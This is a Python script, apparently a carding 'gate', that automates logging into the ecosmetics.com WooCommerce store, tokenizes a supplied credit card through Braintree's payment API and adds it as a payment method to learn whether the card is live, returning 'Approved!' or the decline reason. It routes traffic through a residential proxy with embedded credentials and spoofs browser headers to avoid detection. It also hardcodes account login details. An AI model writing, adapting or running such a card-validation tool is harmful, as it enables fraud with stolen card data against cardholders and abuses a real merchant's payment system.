import urllib3
from requests import Session
from retry_requests import retry
from configbraintreee.ConfigsBraintree import BehaviorsBraintree
import requests
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class BraintreeAuthWoo:
    'Clase de la pagina que quedara como gate'
    def main(self,card):
        try: 
            self.session = requests.Session()
            self.session.proxies.update({'http://': 'http://17f478d14ce695e5:RNW78Fm5@res.proxy-seller.com:10000', 'https://': 'http://17f478d14ce695e5:RNW78Fm5@res.proxy-seller.com:10000'})


            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','priority': 'u=0, i','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
            self.session.get('https://www.ecosmetics.com/', headers=headers)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','priority': 'u=0, i','referer': 'https://www.ecosmetics.com/','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
            self.req_1 = self.session.get('https://www.ecosmetics.com/my-account/', headers=headers)
            self.nonce_login = BehaviorsBraintree().QueryText(self.req_1.text, 'name="woocommerce-login-nonce" value="','"')
            print(self.nonce_login)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://www.ecosmetics.com','priority': 'u=0, i','referer': 'https://www.ecosmetics.com/my-account/','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
            data = {
                'username': 'asuschk1@gmail.com',
                'password': 'Cuenta1234',
                'woocommerce-login-nonce': self.nonce_login,
                '_wp_http_referer': '/my-account/',
                'login': 'Log in',
            }
            self.session.post('https://www.ecosmetics.com/my-account/', headers=headers, data=data)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','priority': 'u=0, i','referer': 'https://www.ecosmetics.com/my-account/','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
            self.session.get('https://www.ecosmetics.com/my-account/', headers=headers)
            time.sleep(5)
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','priority': 'u=0, i','referer': 'https://www.ecosmetics.com/my-account/','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
            self.session.get('https://www.ecosmetics.com/my-account/payment-methods/', headers=headers)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','priority': 'u=0, i','referer': 'https://www.ecosmetics.com/my-account/payment-methods/','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
            self.req_2 = self.session.get('https://www.ecosmetics.com/my-account/add-payment-method/', headers=headers)
            print(self.req_2)
            wc_braintree_client_token = BehaviorsBraintree().QueryText(self.req_2.text,'var wc_braintree_client_token = ["','"')
            payment_nonce = BehaviorsBraintree().QueryText(self.req_2.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
            self.token_bear = BehaviorsBraintree().DecodeBear(wc_braintree_client_token)
            
            self.client_id = BehaviorsBraintree().SessionId()
            self.ccs = BehaviorsBraintree().Ccs(card)

            headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9','authorization': f'Bearer {self.token_bear}','braintree-version': '2018-05-10','content-type': 'application/json','origin': 'https://assets.braintreegateway.com','priority': 'u=1, i','referer': 'https://assets.braintreegateway.com/','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'cross-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': self.client_id,
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': self.ccs[0],
                            'expirationMonth': self.ccs[1],
                            'expirationYear': self.ccs[2],
                            'cvv': self.ccs[3],
                            'billingAddress': {
                                'postalCode': '10036',
                                'streetAddress': 'Times Square, Nueva York, EE. UU.',
                            },
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }
            self.req_3 = self.session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
            self.nonce_card = BehaviorsBraintree().QueryText(self.req_3.text,'{"token":"','"')

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://www.ecosmetics.com','priority': 'u=0, i','referer': 'https://www.ecosmetics.com/my-account/add-payment-method/','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
            self.braintree_cc_config_data = {"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/7dfb867dh9n7qcmq/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/7dfb867dh9n7qcmq"},"merchantId":"7dfb867dh9n7qcmq","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"7dfb867dh9n7qcmq","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":None},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":False,"threeDSecure":None,"androidPay":{"displayName":"eCosmetics","enabled":True,"environment":"production","googleAuthorizationFingerprint":self.token_bear,"paypalClientId":"AcC9_UON8FtbSW6e4tb11d8AADy6iNyKKiqPACrVBvVoGvdLtpSATU3EwLDLlfjoM5sHDLSb2iPuVNP5","supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":True,"paypal":{"displayName":"eCosmetics","clientId":"AcC9_UON8FtbSW6e4tb11d8AADy6iNyKKiqPACrVBvVoGvdLtpSATU3EwLDLlfjoM5sHDLSb2iPuVNP5","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":False,"unvettedMerchant":False,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":True,"merchantAccountId":"ecosmetics_instant","payeeEmail":None,"currencyIsoCode":"USD"}}
            data = {
                'payment_method': 'braintree_cc',
                'braintree_cc_nonce_key': self.nonce_card,
                'braintree_cc_device_data': '{"device_session_id":"8229026e9ab6779a843a339148a8e935","fraud_merchant_id":null,"correlation_id":"6b83163e49574e0b87024d44218063f3"}',
                'braintree_cc_3ds_nonce_key': '',
                'braintree_cc_config_data': f'{self.braintree_cc_config_data}',
                'woocommerce-add-payment-method-nonce': payment_nonce,
                '_wp_http_referer': '/my-account/add-payment-method/',
                'woocommerce_add_payment_method': '1',
            }

            response = self.session.post('https://www.ecosmetics.com/my-account/add-payment-method/', headers=headers, data=data)
            time.sleep(5)
            self.session.close()
            error = BehaviorsBraintree().QueryText(response.text, 'class="woocommerce-error" role="alert">', '</li>').split('<li>')
            
            if error[1] == '\n\t\t\t\t\t': return 'Approved! ✅', '1000: Approved'
            else: return BehaviorsBraintree().Response(error[1].split('t method. Reason: ')[1].strip())

        except: 
            return 'Payment error: Gateway Rejected: risk_threshold'


